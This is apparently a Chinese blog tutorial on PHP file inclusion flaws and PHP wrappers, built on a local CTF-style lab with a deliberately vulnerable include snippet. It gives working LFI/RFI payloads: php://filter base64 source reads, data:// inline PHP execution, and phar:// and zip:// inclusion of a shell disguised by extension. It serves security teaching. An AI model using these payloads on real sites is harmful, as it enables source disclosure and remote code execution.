# WEB 文件包含 /伪协议

首先谈谈什么是文件包含

 [WEB入门——文件包含漏洞与PHP伪协议_文件包含php伪协议_HasntStartIsOver的博客-CSDN博客](https://blog.csdn.net/HasntStartIsOver/article/details/130952590) 

## 文件包含

```php
程序员在编写的时候 可能写了自己的 函数 
如果想多次调用 那么就需要 重新写在源代码中
太过于麻烦了
 
 
只需要写入 funcation.php
 
然后在需要引用的地方 利用include funcation.php 函数
就可以调用  function.php的代码
 
 
但是如果 网站开发人员 把 include  中的php 作为一个变量
 
那么普通用户也可以通过传参 来访问 这个文件
 
就造成了 文件包含漏洞
 
例如 
 
 
$a=$_GET['a'];
include $_GET['a'];
 
 
这样就对上传的东西 没有控制 那么就可以访问文件了
```

我们来本地搭建一个环境看看



一个flag  一个test



<img src="https://i-blog.csdnimg.cn/blog_migrate/bbfc17c17010cc5f8c549f0e763e92ca.png" alt="" style="max-height:181px; box-sizing:content-box;" />


```php
<?php 
 
highlight_file(__FILE__);
 
if(isset($_GET['file'])) {
    $str = $_GET['file'];
 
    include $_GET['file'];
}
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/b6c57533c4f9746d34ac8d21167de889.png" alt="" style="max-height:224px; box-sizing:content-box;" />


这里就存在漏洞 因为对我们的传参没有限制 我们就可以访问文件了

```cobol
?file=./flag.txt   ./ 表示当前目录
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/2a9c49a32cf62e2aaca6c5b550a1d7b9.png" alt="" style="max-height:127px; box-sizing:content-box;" />


这样就访问了 flag文件

这就是最简单的文件包含漏洞

### 这里给出常见的文件包含的函数

#### include

```scss
include()
当文件读取到 include()的时候 才把文件包含进来 并且发生错误会发出警告 但是还是会继续执行
```

#### include_once

```scss
include_once()
一样的 但是 如果文件已经被包含一次
那么就不会再被包含
```

#### 区别



<img src="https://i-blog.csdnimg.cn/blog_migrate/f8a11aa854b0af8425baa27b37215738.png" alt="" style="max-height:185px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/219115977daa906d573cb3a22e810b31.png" alt="" style="max-height:312px; box-sizing:content-box;" />


如果包含了一次第二次就不会执行了

#### require

```scss
require() 
和inculde 作用一样 但是如果出错了 就会终止 停止执行
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/8e2c870adafae295f923f37f56eaeb25.png" alt="" style="max-height:250px; box-sizing:content-box;" />


#### require_once

```scss
require_once()
一样的 包含两次的话就不会执行了
```

#### 区别

和上面一样

#### highlight_file、show_source

```scss
highlight_file()   、show_source()
 
对文件进行高亮显示  通常可以看到源代码
```







<img src="https://i-blog.csdnimg.cn/blog_migrate/466c3b292a4b1a5feac578ca7f1e8112.png" alt="" style="max-height:627px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/f3efd172340406a8fcdad92ed430c38d.png" alt="" style="max-height:361px; box-sizing:content-box;" />


#### readfile、file_get_contents

```scss
readfile()  file_get_contents()
 
读取文件 送入缓冲区
注意这里会直接解析 php 文件
 
 
file_get_contents()
是读取文件作为一个字符串
```

p



<img src="https://i-blog.csdnimg.cn/blog_migrate/c3fbf7d4fed06beff04302944ad6edd3.png" alt="" style="max-height:900px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/2a753d6d1dc639fffb84562d8a0fc407.png" alt="" style="max-height:764px; box-sizing:content-box;" />


乱码是因为我没有设置解析



#### fopen

```scss
fopen()
 
打开一个文件或者 url
```

这里就是文件包含常见的函数

这里我们再给出分类

### 文件包含漏洞的分类

#### 本地文件包含

被包含的文件在本地服务器中 那么就是本地文件包含

### 远程文件包含

在

php.ini中的 all_url_fopen和include 打开的话 就会远程文件包含



<img src="https://i-blog.csdnimg.cn/blog_migrate/7fe7874158d77f54423b9a00edfdd5cd.png" alt="" style="max-height:162px; box-sizing:content-box;" />


远程文件包含就是

```cobol
两个服务器
一个是本地服务器
一个是攻击者的
 
 
攻击者的web 根目录中写入 shell
那么
 
 
127.0.0.1/test.php?file=服务器的id/shell
 
 
这样就可以访问到shell 
```

接下来我们解释 伪协议

## 伪协议

首先给出常见的 伪协议

### file://  协议

```cobol
file://[文件的绝对路径和文件名]
访问本地文件
```

```cobol
?file=file:///d:\phpstudy_pro\WWW\flag.txt
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/b6e7120d9d417b5a36afe47ce609f33c.png" alt="" style="max-height:250px; box-sizing:content-box;" />


### php:// 协议

php协议有很多

这里给出常用的

```cobol
php://filter： 用于读源码
 
 
php://input： 用于执行php代码
```

#### php://filter

这在ctf中 很多都是使用 这个 就可以读取源代码

```cobol
?file=php://filter/resource=flag.txt
无过滤的读取  直接返回全部
 
?file=php://filter/read=string.toupper/resource=flag.txt
 
通过设置read的值 来返回读取的内容
 
 
 
?file=php://filter/convert.base64-encode/resource=flag.txt
 
通过base64加密后 flag的内容
 
?file=php://filter/read=string.toupper|convert.base64-encode/resource=flag.txt
 
通过 大写 并且 base64加密
```

#### php://input

需要 allow_url_include 为on

```php
<?php
$user = $_GET["user"];
$pass = $_GET["pass"];
if(isset($user)&&(file_get_contents($user,'r')==="123123")){
    echo "hello admin!<br>";
}else{
    echo "you are not admin ! ";
}
?>
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/51c659f7817229a0a7c325e57f449008.png" alt="" style="max-height:385px; box-sizing:content-box;" />


这里我们就向user 传入了 123123的内容

### data://  协议

条件是  双on (fopen/include)

```undefined
该协议 可以将 php代码 通过 协议发送并且执行
```

##### 用法

```cobol
?file=data://text/plain,<?php phpinfo()?>
 
 
 
?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=
 
 
base64加密后
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/ba7ce98358d2826084f96069b152b12e.png" alt="" style="max-height:579px; box-sizing:content-box;" />




### phar://协议

```cobol
这个伪协议可以访问 解压包中的文件的内容
 
phar://[解压包路径/被解压文件名称]
```

我们首先创建一个 shell.zip

里面是 shell.php 内容为 <?php echo 'hello';?>

然后来访问

```cobol
?file=phar://./shell.zip/shell.php
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/d268a4f89e97bd72f29b9c4c54849367.png" alt="" style="max-height:218px; box-sizing:content-box;" />


#### 注意 这个协议无视后缀名

shell.zip 该为 shell.png

```cobol
?file=phar://./shell.png/shell.php
```

依旧可以访问

### zip:// 协议

和phar协议类似 但是需要的是绝对路径

并且 访问压缩包下的内容和压缩包需要用%23(#的url编码)隔开

```cobol
?file=zip://../WWW/shell.zip%23shell.php
```

到这里 常见的伪协议就结束了